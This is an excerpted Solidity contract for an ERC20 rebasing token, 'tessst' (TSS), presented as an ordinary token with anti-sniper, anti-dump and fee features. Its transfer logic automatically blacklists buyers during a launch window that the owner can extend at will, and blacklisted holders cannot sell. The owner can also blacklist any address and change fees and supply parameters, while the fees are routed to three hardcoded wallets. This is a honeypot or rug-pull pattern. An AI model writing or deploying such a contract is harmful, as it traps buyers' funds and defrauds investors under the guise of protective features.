...
contract tessst is ERC20Detailed, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    event LogHyperflate(uint256 indexed epoch, uint256 totalSupply);
    ...
    uint256 public totalFee =
        developmentFee.add(liquidityFee).add(marketingFee).add(buyBackFee);
    ...
    bool antiDump = true;
    bool antiSniper = true;
    uint256 antiSniperPercentage = 13;
    uint256 antiDumpPercentage = 13;
    uint BuyTaxDuration= 1 days;
    ...
    function s_Time(uint256 s_seconds) external onlyOwner{
        BuyTaxDuration = s_seconds;
    }

    function hyperflate(uint256 epoch, int256 supplyDelta)
        external
        onlyMaster
        returns (uint256)
    {
        ...
        if (supplyDelta == 0) {
            emit LogHyperflate(epoch, _totalSupply);
            return _totalSupply;
        }
    ...
    constructor() ERC20Detailed("tessst", "TSS", uint8(DECIMALS)) {
        ...
        marketingFeeReceiver = 0x9f19b518CB9Cb9890ceF99E8a87F9139ae6455c3;
        developmentFeeReceiver = 0x060e2E1142b6AF6402c4Bfb4b0368c948dAe2C9C;
        buyBackFeeReceiver = 0xcc72Dca73A088b2255F089a6207D1C8dCCf34419;

        emit Transfer(address(0x0), msg.sender, _totalSupply);
    }

    function blAddr(address account, bool value) external onlyOwner{
        bl[account] = value;
    }
    ...
    function _transferFrom(
        ...
        require(!bl[sender] && !bl[recipient], 'Blacklisted address');
        if (sender == pair && buyCooldownEnabled)
        {
            require(cooldownTimer[recipient] < block.timestamp,"buy Cooldown exists");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }
        if(recipient != pair && antiSniper && block.timestamp<LaunchTimestamp+BuyTaxDuration){
            bl[recipient] = true;
        }
    ...
    function changeDivider(uint256 _divider) external onlyOwner {
        divider = _divider;
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETHEco = amountETH.mul(developmentFee).div(totalETHFee);
        ...
        (success, ) = payable(developmentFeeReceiver).call{
            value: amountETHEco,
            gas: 30000
        }("");
    ...
    function setFees(
        ...
        totalFee = developmentFee.add(liquidityFee).add(marketingFee).add(buyBackFee);
